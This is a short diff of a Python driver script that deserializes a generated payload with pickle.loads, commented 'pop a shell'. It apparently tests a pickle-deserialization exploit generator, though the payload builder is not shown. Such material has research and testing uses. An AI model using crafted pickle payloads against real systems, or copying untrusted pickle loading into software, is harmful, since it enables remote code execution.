@@ -9,7 +9,4 @@ if __name__ == "__main__":
     payload.call_f(1)
 
     pb = payload.get_payload(check_stop=True)
-    print(len(pb))
-    r = pickle.loads(pb)
-
-    print(r)
+    r = pickle.loads(pb)  # pop a shell
